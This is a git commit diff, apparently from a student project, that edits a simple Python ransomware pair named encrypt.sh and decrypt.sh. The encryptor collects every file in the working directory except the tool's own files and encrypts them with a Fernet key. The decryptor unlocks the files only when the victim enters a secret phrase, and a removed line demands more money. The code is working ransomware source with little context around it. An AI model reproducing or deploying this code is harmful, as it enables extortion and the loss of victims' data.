740568201d82aec2c7c76f44982967ec5bb6460a
ababic20 <ababic20@foi.hr>
2023-12-31 17:17:10 +0100

    Fixed some bugs

--- Implementation/decrypt.sh
+++ Implementation/decrypt.sh
@@ -6,7 +6,7 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-	if file == "decrypt.sh" or file == "encrypt.sh" or file == "netcat.sh" or file == "thekey.key":
+	if file == "decrypt.sh" or file == "encrypt.sh" or file == "netcat.sh" or file == "thekey.key" or file == "detect.sh":
 		continue
 	if os.path.isfile(file):
 		files.append(file)
@@ -15,14 +15,17 @@ with open("thekey.key", "rb") as key:
 	secretkey = key.read()
 	
 secretphrase = "dp"
-user_phrase = input("Enter the secret phrase to decrypt your files\n")
-if user_phrase == secretphrase:
-	for file in files:
-		with open(file, "rb") as thefile:
-			contents = thefile.read()
-		contents_decrypted = Fernet(secretkey).decrypt(contents) 
-		with open(file, "wb") as thefile:
-			thefile.write(contents_decrypted)
-	print("Congrats, you're files are decrypted.")
-else:
-	print("Sorry, wrong secret phrase. Send me more money!"),
+while True:
+    user_phrase = input("Enter the secret phrase to decrypt your files\n")
+    
+    if user_phrase == secretphrase:
+        for file in files:
+            with open(file, "rb") as thefile:
+                contents = thefile.read()
+            contents_decrypted = Fernet(secretkey).decrypt(contents) 
+            with open(file, "wb") as thefile:
+                thefile.write(contents_decrypted)
+        print("Congrats, your files are decrypted.")
+        break  
+    else:
+        print("Sorry, wrong secret phrase. Try again.")
--- Implementation/encrypt.sh
+++ Implementation/encrypt.sh
@@ -5,7 +5,7 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-	if file == "decrypt.sh" or file == "encrypt.sh" or file == "netcat.sh" or file == "thekey.key":
+	if file == "decrypt.sh" or file == "encrypt.sh" or file == "netcat.sh" or file == "thekey.key" or file == "detect.sh":
 		continue
 	if os.path.isfile(file):
 		files.append(file)
